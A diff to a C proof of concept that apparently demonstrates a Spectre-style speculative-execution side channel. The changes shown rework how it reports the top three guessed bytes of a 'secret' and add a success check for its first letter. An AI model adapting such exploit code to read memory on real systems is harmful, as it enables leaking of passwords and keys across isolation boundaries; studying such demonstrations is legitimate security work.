@@ -105,7 +105,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
         }
     }
   }
-
+  //Find the best score
   int maxer = 0;
   int indexOf = -1;
   for (i = 0; i < 256; i++) {
@@ -116,6 +116,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
   }
   value[0] = (uint8_t)indexOf;
   score[0] = results[indexOf];
+
+  //Find the second best score
   maxer = 0;
   int indexOfSecond = -1;
   for (i = 0; i < 256; i++) {
@@ -126,6 +128,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
   }
   value[1] = (uint8_t)indexOfSecond;
   score[1] = results[indexOfSecond];
+
+  //Find the third best score
 
   maxer = 0;
   int indexOfThird = -1;
@@ -143,7 +147,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
 
 int main(int argc, const char * * argv) {
   size_t distanceFromCurrentAddressToDesiredAddress; /* default for malicious_x */
-  int i, score[3], len = 23;
+  int i, score[3];
   uint8_t value[3];
   char* address;
   for (i = 0; i < sizeof(array2); i++)
@@ -170,17 +174,22 @@ int main(int argc, const char * * argv) {
   printf("Malicious x is %zu\n", distanceFromCurrentAddressToDesiredAddress);
   printf("Address of bigArray is %p\n", address);
   printf("Address of the secret is %p\n", secret);
-  while (--len >= 0) {
 
-    readMemoryByte(distanceFromCurrentAddressToDesiredAddress, value, score);
+  readMemoryByte(distanceFromCurrentAddressToDesiredAddress, value, score);
 
-    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-    printf("0x%02X=%c score=%d ", value[0],
+  printf("The best is 0x%02X=%c score=%d\n", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-    printf("(second best: 0x%02X=%c score=%d)", value[1], value[1], score[1]);
-    printf("(third best: 0x%02X=%c score=%d)", value[2],value[2], score[2]);
-    printf("\n");
-    
+  
+  printf("(second best: 0x%02X=%c score=%d)\n", value[1], value[1], score[1]);
+  printf("(third best: 0x%02X=%c score=%d)\n", value[2],value[2], score[2]);
+
+  for (i = 0; i < 3; i++) {
+      if (value[i] == 'P' && score[i] > 0) {
+          //Managed to find this 'P' that is stored in the beginning of "Secret".
+          printf("Success!\n");
+      }
   }
+
   return (0);
 }
+            
